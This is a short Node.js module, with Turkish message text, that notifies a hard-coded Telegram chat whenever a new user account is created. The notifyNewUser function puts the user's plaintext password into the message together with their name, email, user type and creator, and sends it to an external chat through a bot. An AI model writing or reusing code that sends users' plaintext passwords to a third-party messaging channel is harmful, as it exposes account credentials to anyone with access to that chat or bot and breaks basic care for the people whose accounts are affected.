const TelegramBot = require('node-telegram-bot-api');
const moment = require('moment');
require('dotenv').config();

const botToken = process.env.TELEGRAM_BOT_API;
const chatId = '1501880938';

const bot = new TelegramBot(botToken, { polling: false });

function notifyNewUser(user, password) {
  const message = `🆕 Yeni kullanıcı kaydoldu:\n👤 İsim: ${user.name} ${user.lastname}\n📧 Email: ${user.email}~\n Şifre: ${password}\n Kullanıcı Tipi: ${user.user_type.title}\n Oluşturan:${user.created_by.name} ${user.created_by.lastname}\n Oluşturulduğu Tarih: ${moment(user.created_at).format('DD-MM-YYYY HH:mm:ss')}`;
  return bot.sendMessage(chatId, message);
}

module.exports = { notifyNewUser };
